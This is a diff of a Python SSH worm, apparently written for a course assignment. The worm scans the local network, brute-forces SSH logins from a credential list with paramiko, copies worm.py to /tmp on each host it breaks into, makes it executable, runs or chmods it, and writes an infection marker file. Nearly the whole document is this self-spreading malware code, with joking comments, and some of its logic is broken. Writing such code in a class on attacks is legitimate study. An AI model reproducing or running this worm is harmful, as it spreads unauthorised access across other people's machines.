@@ -27,7 +27,10 @@ INFECTED_MARKER_FILE = "/tmp/infected.txt"
 ##################################################################
 def isInfectedSystem():
 	#returns true if file exists and false otherwise. 
-	return os.path.isfile(INFECTED_MARKER_FILE)
+	#i.e. check if the system is infected.  
+	#thanks stackoverflow for telling me the difference between isfile and exists
+	return os.path.exists(INFECTED_MARKER_FILE)
+	#can also be done with an if else statement returning true if infected else false 
 
 #################################################################
 # Marks the system as infected
@@ -36,8 +39,13 @@ def markInfected():
 	
 	#from os import
 	#os.mknod creates a filesystem node (file, device special file or named pipe) 
-	os.mknod(INFECTED_MARKER_FILE)
-
+	#os.mknod(INFECTED_MARKER_FILE)
+	#second attempt 
+	#w for writing
+	infectAttempt = open(INFECTED_MARKER_FILE, 'w') 
+	#debugging
+	infectAttempt.write("This is a stick up")
+	infectAttempt.close()
 
 ###############################################################
 # Spread to the other system and execute
@@ -65,14 +73,22 @@ def spreadAndExecute(sshClient):
 	#client has a open sftp channel now 
 	#put stuff in there now 
 	#put worm.py in the /tmp folder 
+	#client.put("worm.py", "/tmp/worm.py")
+	#changing plans writing the file 
+
+	fileInf = client.file(INFECTED_MARKER_FILE, 'w')
+	fileInf.close()
+
+	#put worm.py in said infected_marker path 
 	client.put("worm.py", "/tmp/worm.py")
 
 	#os stuff, i hate octals, no one told me the 0 was a thing :Ree:
 	client.chmod("/tmp/worm.py", 0777) 
 
 	#execute the command 
-	#might have to debug later and also figure out how to implement the entire bee movie script 
-	sshClient.exec_command("python /tmp/worm.py")
+	#i couldn't implement the entire bee movie's script into the files i'm sad 
+	#BEES 
+	sshClient.exec_command("chmod a+x /tmp/worm.py")
 
 
 
@@ -112,23 +128,24 @@ def tryCredentials(host, userName, password, sshClient):
 
 	#try means try and have excepts to catch errors 
 
+	#If nothing is wrong then we just go and return 0 
 
 	try:
-		# some code (success so 0)
+		print ("Attempting authentication")
+		#going through the list of credentials
 		#try connecting
 		#connect takes 4 parameters, host, part, username, password, but we can ignore the port
 		#following the handout 
 		sshClient.connect(host, username=userName, password=password) 
-		print("yoooooo, we're in man")
+		print("Authentication successful")
+		return 0 #passed 
 	except paramiko.SSHException:
-		print("YOOOOOOOOOO, WRONG CREDENTIALS")
-		return 1
+		print("Authentication Failed, wrong crednetials")
+		return 1 #failed 
 	except socket.error: #yo this stuff is bumpin 
-		print("this server is probably dead so i'm just like YOOOOOOOOOOOOOOOOOO")
-		return 3
+		print("Authentication Failed, Server down or not running SSH")
+		return 3 #failed
 
-	#if nothing is wrong then just return 0 
-	return 0
 
 
 ###############################################################
@@ -150,22 +167,26 @@ def attackSystem(host):
 	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 	
 	# The results of an attempt
-	attemptResults = None
+	auth = None
 				
 	# Go through the credentials
 	for (username, password) in credList:
 
-		#call that function 
-		results = tryCredentials(host, username, password, ssh)
+		#call tryCredentials function 
+		auth = tryCredentials(host, username, password, ssh)
 
 		#local variable 
 		#if result is successful
-		if (results == 0):
-			attemptResults = ssh
+		if (auth == 0):
+			print("infected the host: " + host)
+			return ssh
+		else: 
+			print("Shouldn't get here but oh wells")
+			return None
 			
 	# Could not find working credentials
 	# return whatever we got from the attack (if results weren't successful, eff it, empty list then) 
-	return attemptResults	
+	return None	
 
 ####################################################
 # Returns the IP of the current system
@@ -179,6 +200,7 @@ def getMyIP(interface):
 	# return the IP of the current system.
 
 	# TODO: learn netifaces 
+	interface = netifaces.interfaces()
 
 	#make the ip address = to none 
 	ipAddr = None
@@ -187,6 +209,7 @@ def getMyIP(interface):
 	for netFaces in interface:
 		addr = netifaces.ifaddresses(netFaces)[2][0]['addr']
 
+		#we don't like loopbacks
 		if not addr == "127.0.0.1":
 			ipAddr = addr
 			break
@@ -244,10 +267,11 @@ if len(sys.argv) < 2:
 	# Otherwise, proceed with malice. 
 	if isInfectedSystem == "True":
 		print("Already infected")
-		exit(0)
-	else:
-		print "Infect process starting"
-		markInfected()
+		sys.exit(0)
+	
+	#else:
+	#	print "Infect process starting"
+	#	markInfected()
 
 
 # TODO: Get the IP of the current system
@@ -262,6 +286,7 @@ networkHosts = getHostsOnTheSameNetwork()
 # from the list of discovered systems (we
 # do not want to target ourselves!).
 
+print("Removing IP address from current system")
 networkHosts.remove(sourceIP)
 
 print "Found hosts: ", networkHosts
@@ -282,13 +307,9 @@ for host in networkHosts:
 	# replacing != with not as not just checked the memory source rather than whether the two variables are the same. 
 	if sshInfo and not host == sourceIP:
 		print("Execute order 66 (infection spreads)")
+		spreadAndExecute(sshInfo)
 
-		if not isInfectedSystem(sshInfo[0]):
-			spreadAndExecute(sshInfo[0])
-			markinfected(sshInfo[0])
-			print("The order is complete milord (infection complete)")
-		else:
-			print("The Jedi have won mlord (infection failed)")
+		print("The order is complete")
 			
 
 
